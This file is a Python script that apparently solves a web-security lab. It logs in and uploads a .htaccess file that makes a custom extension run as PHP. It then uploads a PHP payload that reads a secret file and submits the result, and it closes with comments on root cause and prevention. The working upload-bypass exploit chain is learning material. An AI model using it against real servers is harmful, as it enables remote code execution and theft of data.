import requests
import re

# Disable certificate warnings
requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

# Use Burp proxy if needed
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

# Take URL input

app_url = input("Enter your url :  ").strip()

session = requests.Session()

#  fetch the csrf token 
csrf_token = session.get(app_url+"/login",verify=False,proxies=proxies)
match = re.search(r'name="csrf" value="(.*?)"',csrf_token.text) # way to find csrf token
csrf_pattern = match.group(1)
print(csrf_pattern)

data = {"username":"wiener","password":"peter","csrf":csrf_pattern}

login_post = session.post(app_url+"/login",verify=False,data=data,proxies=proxies)
cookie = session.cookies.get_dict()
print(cookie)


# now we fetch upload csrf token 

upload_token = session.get(app_url+"/my-account?id=wiener",verify=False,proxies=proxies)
upload_match = re.search(r'name="csrf" value="(.*?)"',upload_token.text)
upload_pattern = upload_match.group(1)
print(upload_pattern)

# now we upload the file 

# Step 1: Set Apache to treat `.jester` files as PHP using a .htaccess file
appache_for_php ="AddType application/x-httpd-php .jester"

# Step 2: PHP exploit payload to read secret file
exploit = "<?php echo file_get_contents('/home/carlos/secret'); ?>"

# Step 3: Upload the .htaccess file
# This reconfigures Apache to execute .jester files as PHP
# Upload .htaccess with MIME override
files = {
    'avatar':('.htaccess', appache_for_php, 'text/plain'),
    'user': (None, 'wiener'),
    'csrf': (None,upload_pattern)
}

# after login now we are going to exploit 

response = session.post(app_url+"/my-account/avatar",files=files,proxies=proxies,verify=False)
if "The file avatars/.htaccess has been uploaded" in response.text:
    print("file uploaded successfully")


#now we try to upload php file .jester which means only .php
# Step 4: Upload the PHP payload disguised as a .jester file
# Apache now treats .jester as PHP because of the .htaccess
    
files2 = {
    'avatar':('exploit.jester', exploit, 'application/x-httpd-php'),
    'user': (None, 'wiener'),
    'csrf': (None,upload_pattern)
}

response2 = session.post(app_url+"/my-account/avatar",files=files2,proxies=proxies,verify=False)
if "The file avatars/exploit.php has been uploaded" in response.text:
    print("file uploaded successfully")

# now we fetch the content from files//index.php
    
fetch_upload = session.get(app_url+"/files/avatars/exploit.jester",proxies=proxies,verify=False)
flag = fetch_upload.text
print(flag)

# now submitSolution 

submit_flag = session.post(app_url+"/submitSolution",proxies=proxies,verify=False,data={"answer": flag})
if '"correct":true' in submit_flag.text:
    print("flag submit sucessfully")


# 💥 Root Cause:
# - The upload feature does not sanitize file extensions or MIME types.
# - Apache is misconfigured with "AllowOverride All", allowing .htaccess files to override MIME handling.
# - This lets an attacker bypass extension filters and execute arbitrary code on the server.
    




    # 🚫 How to Prevent This Vulnerability:
#
# ✅ 1. Disable .htaccess overrides:
#    In the Apache configuration, set "AllowOverride None" for upload directories.
#    This prevents attackers from using .htaccess to change how files are handled.
#
#    Example:
#    <Directory /var/www/html/uploads>
#        AllowOverride None
#    </Directory>
#
# ✅ 2. Store uploads outside the web root:
#    Save uploaded files in a directory that is not publicly accessible via the browser.
#    This ensures even if a malicious file is uploaded, it cannot be executed.
#
# ✅ 3. Whitelist allowed file types and extensions:
#    Only allow known-safe extensions like .jpg, .png, .gif, etc.
#    Reject all other types, especially anything that can be executed (e.g., .php, .phtml).
#
# ✅ 4. Sanitize file content, not just the name:
#    Validate file headers (magic bytes) to confirm the file is truly an image, not PHP code in disguise.
#
# ✅ 5. Use safe MIME types:
#    Don’t trust user-submitted MIME types — verify server-side.
#
# ✅ 6. Remove execute permissions from upload folders:
#    If files in the uploads folder cannot be executed, even uploaded scripts won't run.
#
# ✅ 7. Log and monitor file uploads:
#    Detect suspicious file types, repeated uploads, or strange behavior early.
#
# ✅ 8. Apply Content Security Policy (CSP):
#    Helps reduce the impact of XSS and limits what uploaded files can do if accessed.
